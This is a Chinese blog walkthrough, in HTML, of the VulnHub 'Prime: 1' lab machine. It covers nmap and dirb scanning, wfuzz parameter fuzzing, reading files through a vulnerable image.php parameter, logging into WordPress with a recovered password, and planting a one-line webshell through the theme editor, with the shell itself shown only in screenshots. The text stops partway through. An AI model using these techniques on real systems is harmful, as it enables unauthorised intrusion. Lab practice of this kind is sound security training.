@@ -1,0 +1,633 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>【vulnhub】Prime1攻略 | jenchoi413的博客</title><meta name="keywords" content="靶场,vulnhub系列"><meta name="author" content="jenchoi413"><meta name="copyright" content="jenchoi413"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="资源Prime: 1 ~ VulnHub 找靶机IP通过Guest确定IP最下面，有个Guest用户可以登录进去  右键，Open Terminal打开终端窗口  直接执行ifconfig，哎~这IP不就拿到了吗？  通过扫描确定IP 这是在B站听无涯老师的课程看到的方法 不登陆也能找到IP，不过我还是觉得，既然有上面那个口子可以达到目的，就没有必要搞得这么麻烦，这里仅仅作为拓展思维  用Nmap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【vulnhub】Prime1攻略">
+<meta property="og:url" content="https://jenchoi.top/2022/prime-1-walkthrough/index.html">
+<meta property="og:site_name" content="jenchoi413的博客">
+<meta property="og:description" content="资源Prime: 1 ~ VulnHub 找靶机IP通过Guest确定IP最下面，有个Guest用户可以登录进去  右键，Open Terminal打开终端窗口  直接执行ifconfig，哎~这IP不就拿到了吗？  通过扫描确定IP 这是在B站听无涯老师的课程看到的方法 不登陆也能找到IP，不过我还是觉得，既然有上面那个口子可以达到目的，就没有必要搞得这么麻烦，这里仅仅作为拓展思维  用Nmap">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg">
+<meta property="article:published_time" content="2022-11-05T10:48:29.000Z">
+<meta property="article:modified_time" content="2023-07-02T05:45:10.052Z">
+<meta property="article:author" content="jenchoi413">
+<meta property="article:tag" content="靶场">
+<meta property="article:tag" content="vulnhub系列">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://jenchoi.top/2022/prime-1-walkthrough/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//s4.cnzz.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?b720dcdb57e855ce5d2f82f91128d490";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" data-pjax="data-pjax" src="https://s4.cnzz.com/z_stat.php?id=G-RHZRPR9QK1&amp;web_id=G-RHZRPR9QK1"></script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '【vulnhub】Prime1攻略',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-07-02 13:45:10'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/moments"><i class="fa-fw fas fa-comments"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">jenchoi413的博客</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/moments"><i class="fa-fw fas fa-comments"></i><span> 说说</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【vulnhub】Prime1攻略</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-05T10:48:29.000Z" title="发表于 2022-11-05 18:48:29">2022-11-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-02T05:45:10.052Z" title="更新于 2023-07-02 13:45:10">2023-07-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/">安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8/%E9%9D%B6%E5%9C%BA/">靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>16分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="【vulnhub】Prime1攻略"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2022/prime-1-walkthrough/#post-comment"><span class="waline-comment-count" data-path="/2022/prime-1-walkthrough/"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h1><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/prime-1,358/">Prime: 1 ~ VulnHub</a></p>
+<h1 id="找靶机IP"><a href="#找靶机IP" class="headerlink" title="找靶机IP"></a>找靶机IP</h1><h2 id="通过Guest确定IP"><a href="#通过Guest确定IP" class="headerlink" title="通过Guest确定IP"></a>通过Guest确定IP</h2><p>最下面，有个Guest用户可以登录进去</p>
+<p><img src="/img/image-20221105143451128.png" alt="image-20221105143451128"></p>
+<p>右键，Open Terminal打开终端窗口</p>
+<p><img src="/img/image-20221103140616028.png" alt="image-20221103140616028"></p>
+<p>直接执行ifconfig，哎~这IP不就拿到了吗？</p>
+<p><img src="/img/image-20221103140855419.png" alt="image-20221103140855419"></p>
+<h2 id="通过扫描确定IP"><a href="#通过扫描确定IP" class="headerlink" title="通过扫描确定IP"></a>通过扫描确定IP</h2><blockquote>
+<p>这是在B站听无涯老师的课程看到的方法</p>
+<p>不登陆也能找到IP，不过我还是觉得，既然有上面那个口子可以达到目的，就没有必要搞得这么麻烦，这里仅仅作为拓展思维</p>
+</blockquote>
+<p><strong>用Nmap扫描C段</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.120.1/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20221103141649097.png" alt="image-20221103141649097"></p>
+<p>可以看到，同网段扫到了四个机子，一般*.1*是自己的物理机，太小太大的都不考虑，就剩128和145了，而128是我Kali的IP，所以剩下的145就是靶机的IP了。</p>
+<p>要是觉得上面的方法靠猜测不妥，凭什么要排除太大和太小的IP啊是吧？这里给出另外一种方法。</p>
+<p>刚刚扫一遍，得到4个存活的IP，这时候把靶机给关了，再扫描一遍C段，应该只有三个了，第二次消失的那一个，就是靶机的IP了。</p>
+<p>那找到IP之后，我们要登录这个系统，有什么办法可以找到密码呢？</p>
+<h1 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h1><p>拿到IP之后，可以继续扫描，这个IP开放了哪些端口，都运行着什么服务，也许就能找到突破口呢。</p>
+<p>继续<strong>用Nmap扫全端口</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-65535 192.168.120.145</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里通过-p参数指定全端口，不指定的话，只会扫描常用端口</p>
+</blockquote>
+<p><img src="/img/image-20221103143407496.png" alt="image-20221103143407496"></p>
+<p>扫到2个端口，22和80，对应的服务，也写出来了</p>
+<blockquote>
+<p>如果扫出来的端口比较陌生，不知道运行着什么服务，可以百度查询</p>
+<p>这里给出一份<a target="_blank" rel="noopener" href="https://nsrc.org/workshops/2009/summer/presentations/day3/common-ports.pdf">常用的端口对应的服务</a></p>
+</blockquote>
+<p>22端口是SSH服务，无非就是用Xshell去连接，没啥突破口。</p>
+<p>80端口开放的是HTTP服务，也就是有Web服务啊！！！那不开整？</p>
+<h1 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h1><p>用浏览器打开上面开放的80端口</p>
+<p><strong>访问网址</strong>：IP:port，我这里就是192.168.120.145:80（其实直接输入ip就可以访问了，应为HTTP协议默认就是80端口）</p>
+<p><img src="/img/image-20221103144324733.png" alt="image-20221103144324733"></p>
+<p>嗯？？这什么情况？？WTF？？？就一张图片？？？玩呢？？</p>
+<p>冷静冷静哈！思考下，遇到就一张图片，有什么思路可以进行下去？</p>
+<ul>
+<li>CMS指纹识别</li>
+<li>Ctrl+U查看前端源码</li>
+<li>目录扫描</li>
+</ul>
+<p>思路列出来了，一个个尝试吧</p>
+<p>CMS指纹识别，壮烈牺牲</p>
+<p><img src="/img/image-20221103144853909.png" alt="image-20221103144853909"></p>
+<p>emmm源码就。。。算了吧</p>
+<p><img src="/img/image-20221103145005398.png" alt="image-20221103145005398"></p>
+<p>那就只有<strong>目录扫描</strong>了</p>
+<p>问题是怎么扫呢？用啥工具呢？</p>
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>工具</p>
+<ul>
+<li>dirb</li>
+<li>御剑</li>
+<li>webscan</li>
+<li>gobuster</li>
+<li>dirsearch</li>
+<li>BurpSuite</li>
+<li>………（工具很多）</li>
+</ul>
+<p>我打开dirb就是一顿扫（kali自带dirb）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.120.145</span><br></pre></td></tr></table></figure>
+
+<p>啊嘞？还有工具连-u都不要加的？不管，看结果</p>
+<p><img src="/img/image-20221103160653117.png" alt="image-20221103160653117"></p>
+<p>扫出了一个WordPress，一看就知道，这是个个人博客。</p>
+<p>打开看看，果然！有没有发现这个victor有点似曾相识？？</p>
+<p><img src="/img/image-20221103160539432.png" alt="image-20221103160539432"></p>
+<p>嘚，白高兴一场，啥也没有发现。</p>
+<p>接下来又看了看扫出来的其他目录，全是WordPress的大概看了下，这条路肝不下去了。</p>
+<p>只能想想有没有其他办法。密码有没有可能存在一个文件里？首先想到的就是txt，接着我又用dirb对txt后缀的来了一顿扫</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.120.145 -X .txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p>欸？？？这是啥？<code>secret.txt</code>？？？赶紧打开看看</p>
+<p><img src="/img/image-20221103161740535.png" alt="image-20221103161740535"></p>
+<p>果然有东西啊！！（Prime1：看你太菜了给你点提示吧）</p>
+<p><img src="/img/image-20221103161920266.png" alt="image-20221103161920266"></p>
+<p>整段翻译如下</p>
+<blockquote>
+<p>小伙子有点东西啊！</p>
+<p>但还是菜了点哟！给你点提示：</p>
+<p><strong>对你发现的每一页php做一些Fuzz，如果Fuzz到了正确的参数，然后照着下面的步骤做</strong></p>
+<p><strong>查看<code>location.txt</code>，你就知道下一步该怎么走了。</strong></p>
+<p>如果你还是菜的不行，来<a target="_blank" rel="noopener" href="https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web">我们网站</a>学习一下基本工具的使用</p>
+</blockquote>
+<p>我不管，我才不要等下再用这个提示，我就是要现在就访问<code>location.txt</code>，不然我不甘心</p>
+<p><img src="/img/image-20221103162840784.png" alt="image-20221103162840784"></p>
+<p>甘心了，，，对不起打扰了！</p>
+<h2 id="Fuzz参数"><a href="#Fuzz参数" class="headerlink" title="Fuzz参数"></a>Fuzz参数</h2><p>既然上面提到php，那就先扫一下有哪些php，再针对每个php做Fuzz</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.120.145 -X .php</span><br></pre></td></tr></table></figure>
+
+<p>就扫出来这俩</p>
+<p><img src="/img/image-20221103163102067.png" alt="image-20221103163102067"></p>
+<p><strong>激动人心的Fuzz</strong></p>
+<p>问题来了，Fuzz是个啥？不懂的来看看<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/2848962?fr=aladdin">度娘的解释</a></p>
+<p>看懂了么？我唬你呢！看了比没看还模糊了是吧哈哈哈</p>
+<p>我这里用我自己的浅显理解来解释一下Fuzz</p>
+<blockquote>
+<p>Fuzz即<strong>模糊测试</strong></p>
+<p>就是瞎鸡儿乱猜的意思</p>
+<p>用上面的例子来说，要你Fuzz参数，那参数是个啥样子？get请求下就是<a target="_blank" rel="noopener" href="http://192.168.120.145/index.php?%E5%8F%82%E6%95%B0=xxx">http://192.168.120.145/index.php?参数=xxx</a></p>
+<p>至于参数是啥，我不知道啊，那我就只能乱猜，万一瞎猫碰上死耗子，给我猜对了呢？</p>
+<p>Fuzz就是这样，不看技术，全看运气，谁也不知道到底能不能猜对</p>
+</blockquote>
+<p>工具随便哈，很多工具都可以做Fuzz（BP就可以）</p>
+<p>我这里选择直接用kali里面自带的工具<code>wfuzz</code>和自带的字典</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.120.145/index.php?FUZZ</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20221103170429320.png" alt="image-20221103170429320"></p>
+<p>这里解释下这几列的含义</p>
+<ul>
+<li>ID：就id，没啥别的意思</li>
+<li>Response：HTTP请求返回的状态码</li>
+<li>Lines：返回包的行数</li>
+<li>Word：单词个数</li>
+<li>Chars：字符个数</li>
+<li>Payload：Fuzz的参数</li>
+</ul>
+<p>上面字典返回了900多条数据，那怎么找那些可能是正确的参数呢？思路是与大部分不同的一般就有蹊跷，因为大部分参数是错的，那正确的势必返回的就不一样。</p>
+<p>Burp爆破的话，直接点一下排序就看出来了，这个破工具还要用命令行重新执行命令来排序，我真的会谢！</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先看看参数，看有啥可以用的</span></span><br><span class="line">wfuzz -h</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用参数过滤</span></span><br><span class="line">--hc		# 过滤掉某个响应状态</span><br><span class="line">--hl		# 过滤掉响应为x行的</span><br><span class="line">--hw		# 过滤掉响应为x个单词的</span><br><span class="line">--hh		# 过滤掉响应为x个字符的</span><br></pre></td></tr></table></figure>
+
+<p>我这里随便选个过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -hl 7 http://192.168.120.145/index.php?FUZZ</span><br></pre></td></tr></table></figure>
+
+<p>结果是：糟糕！裤衩子都过滤没了</p>
+<p><img src="/img/image-20221103172027133.png" alt="image-20221103172027133"></p>
+<p>那就只能换个参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -hw 12 http://192.168.120.145/index.php?FUZZ</span><br></pre></td></tr></table></figure>
+
+<h2 id="得到index-php的参数"><a href="#得到index-php的参数" class="headerlink" title="得到index.php的参数"></a>得到index.php的参数</h2><p>有东西啊！</p>
+<p><img src="/img/image-20221103172145627.png" alt="image-20221103172145627"></p>
+<p>还记得上面<code>secret.txt</code>里面的提示吗？记不记得有个<code>location.txt</code>？</p>
+<p>还有扫出来的两个php文件：<code>image.php</code>和<code>index.php</code></p>
+<p>现在用这个Fuzz出来的参数试试吧！</p>
+<p><code>image.php</code>没变化</p>
+<p><img src="/img/image-20221103183545155.png" alt="image-20221103183545155"></p>
+<p><code>index.php</code>出现了点不一样的东西，多了些文字</p>
+<p><img src="/img/image-20221103172359891.png" alt="image-20221103172359891"></p>
+<p>翻译</p>
+<blockquote>
+<p>小伙子不错啊！</p>
+<p>现在你知道正确的参数了</p>
+<p><strong>用<code>secrettier360</code>参数去尝试其他的php页面吧！</strong></p>
+</blockquote>
+<h2 id="得到iamge-php的参数"><a href="#得到iamge-php的参数" class="headerlink" title="得到iamge.php的参数"></a>得到iamge.php的参数</h2><p>这时，把上面没变化的<code>image.php</code>按照提示的参数试一试</p>
+<p><img src="/img/image-20221103184200350.png" alt="image-20221103184200350"></p>
+<p>好的，你得到了正确的参数</p>
+<h2 id="password-txt"><a href="#password-txt" class="headerlink" title="password.txt"></a>password.txt</h2><p>然后呢，就一句话就没了？？？思路好像又断了，继续往下想想，既然给了file让我们来读取文件，那我们可不可以去读取一些敏感文件呢？说干就干！</p>
+<p>然而，emmmmmm…….又断了，系统提示挖错文件了</p>
+<p><img src="/img/image-20221103184903209.png" alt="image-20221103184903209"></p>
+<p>试试另外一个，居然成了，好吧我装的，因为我去看了视频。</p>
+<p>我一直在试前面那个<code>index.php</code>的参数，反而忽视了靶场一步步把我们引到到<code>image.php</code>，还给了正确的参数。</p>
+<p><img src="/img/image-20221103185510097.png" alt="image-20221103185510097"></p>
+<p>接下来就顺着给出的提示，我尝试直接读取password.txt，没有结果</p>
+<p>看了一眼上面的提示，Find <strong>password.txt</strong> in <strong>my directory</strong></p>
+<p>分析主要的突破点是要知道提示所说的<strong>my directory</strong>是指的哪一个目录，想到Linux下，每一个用户都有一个home目录，用户名是victor，接下来我们就来验证这条猜想</p>
+<p><img src="/img/image-20221103190414091.png" alt="image-20221103190414091"></p>
+<p>还是那句话，空空如也，我C他NN的！！！</p>
+<p>这时候，我又去看了一眼上面的截图，就在我画框的后面，就有路径啊！！！我顺着那个路径找过去，出来了！还是我太菜了，Linux基础学的不好，才去分析上面那一堆有的没的。</p>
+<p><img src="/img/image-20221103190658299.png" alt="image-20221103190658299"></p>
+<h2 id="登录WordPress"><a href="#登录WordPress" class="headerlink" title="登录WordPress"></a>登录WordPress</h2><p>当时看到这串字符的时候，我第一反应是有点懵，要我关注ippsec？？？这是啥意思，过了一会才反应过来，这有没有可能就是密码啊？而且这是password.txt欸？</p>
+<p>拿着这串字符去试着登录了一下victor用户，喜提”密码错误“💔💔💔</p>
+<p><img src="/img/image-20221103190941126.png" alt="image-20221103190941126"></p>
+<p>到这，我又不知道怎么办了。</p>
+<p>去看了下视频的提示：<strong>这到底是什么的密码？</strong></p>
+<p>于是我想起，之前端口扫描的时候，有个22端口，猜测有可能是<strong>SSH</strong>的密码，我马上打开我的XShell。</p>
+<p>哈哈，没连上mad❗</p>
+<p>然后我又想，还有啥密码？前面好像还有个WordPress博客，去试试看，也许就是这个呢？然后我往上翻了下之前目录扫描的截图，进到了<a target="_blank" rel="noopener" href="http://192.168.120.145/wordpress/wp-admin%EF%BC%8C%E7%84%B6%E5%90%8E%E8%B7%B3%E8%BD%AC%E5%88%B0wordpress%E7%9A%84%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2">http://192.168.120.145/wordpress/wp-admin，然后跳转到wordpress的登陆界面</a></p>
+<p><img src="/img/image-20221103225332819.png" alt="image-20221103225332819"></p>
+<p>用户名当然是猜的victor，因为之前看过这个博客首页，加上靶机上的登录用户名也是victor，密码输入follow_the_ippsec，点登录</p>
+<blockquote>
+<p>后面了解到，WordPress在搭建成功后会自动生成一篇博客，用户名就是管理员的用户名</p>
+<p>还有Kali自带的工具<code>cmseek</code>和<code>wpscan</code>可以去扫描WordPress站点的用户名和漏洞，以及其他信息</p>
+</blockquote>
+<p>在几秒的转圈圈之后，进去了！！！</p>
+<p><img src="/img/image-20221103225535739.png" alt="image-20221103225535739"></p>
+<p>找了一圈，没发现什么信息。唯一发现了一个邮箱，我还用这个邮箱去试了一下密码，不对，作罢！</p>
+<p>又开始偷思路😂😂😂</p>
+<h2 id="WordPress主题编辑"><a href="#WordPress主题编辑" class="headerlink" title="WordPress主题编辑"></a>WordPress主题编辑</h2><p>了解到【Appearance】的【Theme Editer】可以编辑主题，里面存在部分php可以被编辑，php哦！！！还是可以编辑的，那不直接一句话木马开搞？？？</p>
+<p><img src="/img/image-20221103231333565.png" alt="image-20221103231333565"></p>
+<p>接下来就是去找可以编辑的，连着点了好多个，都是这种不能修改的</p>
+<p><img src="/img/image-20221103231930552.png" alt="image-20221103231930552"></p>
+<p>皇天不负有心人！终于找到一个能改的</p>
+<p><img src="/img/image-20221103232115455.png" alt="image-20221103232115455"></p>
+<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>直接开整！！！等啥呀？</p>
+<p><img src="/img/image-20221103232359755.png" alt="image-20221103232359755"></p>
+<p>上传成功！nice！好了，就等着我拿下你吧小卡拉米！</p>
+<p>高高兴兴掏出我的蚁剑</p>
+<p><img src="/img/image-20221104100447856.png" alt="image-20221104100447856"></p>
+<p>好了，问题来了，我这个URL要怎么填？WordPress的后台编辑那里的url是<a target="_blank" rel="noopener" href="http://192.168.120.145/wordpress/wp-admin/theme-editor.php?file=secret.php&amp;theme=twentynineteen%EF%BC%8C%E8%BF%99%E4%B8%80%E7%9C%8B%E5%B0%B1%E4%B8%8D%E8%A1%8C%E5%95%8A%EF%BC%8C%E6%88%91%E8%A6%81%E6%89%BE%E5%88%B0secret.php%E7%9A%84%E7%9C%9F%E5%AE%9E%E8%B7%AF%E5%BE%84%E6%89%8D%E8%A1%8C%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E5%AF%B9WordPress%E4%B8%8D%E7%86%9F%E6%82%89%EF%BC%8C%E4%B8%8D%E7%9F%A5%E9%81%93%E6%80%8E%E4%B9%88%E7%8C%9C%E8%BF%99%E4%B8%AA%E8%B7%AF%E5%BE%84%E3%80%82">http://192.168.120.145/wordpress/wp-admin/theme-editor.php?file=secret.php&amp;theme=twentynineteen，这一看就不行啊，我要找到secret.php的真实路径才行，但是我对WordPress不熟悉，不知道怎么猜这个路径。</a></p>
+<h2 id="确定路径"><a href="#确定路径" class="headerlink" title="确定路径"></a>确定路径</h2><p>我知道WordPress是开源的，于是我上<a target="_blank" rel="noopener" href="https://core.trac.wordpress.org/browser/#branches/5.2/src/wp-admin/includes">WordPress官网</a>下了一份5.2版本的源码（<strong>Dashboard</strong>往下划，<strong>At a Glance</strong>板块可以看到WordPress的版本和使用的主题）</p>
+<p><img src="/img/image-20221104110916788.png" alt="image-20221104110916788"></p>
+<p>然后就顺着这个线索，结合上面修改页面右侧的文件结构，在源码里找到了这个路径</p>
+<p><img src="/img/image-20221104111036384.png" alt="image-20221104111036384"></p>
+<p><img src="/img/image-20221104111310256.png" alt="image-20221104111310256"></p>
+<p>接下来我就按照这个路径，用蚁剑去连了。</p>
+<p>直接红一片我也是没想到</p>
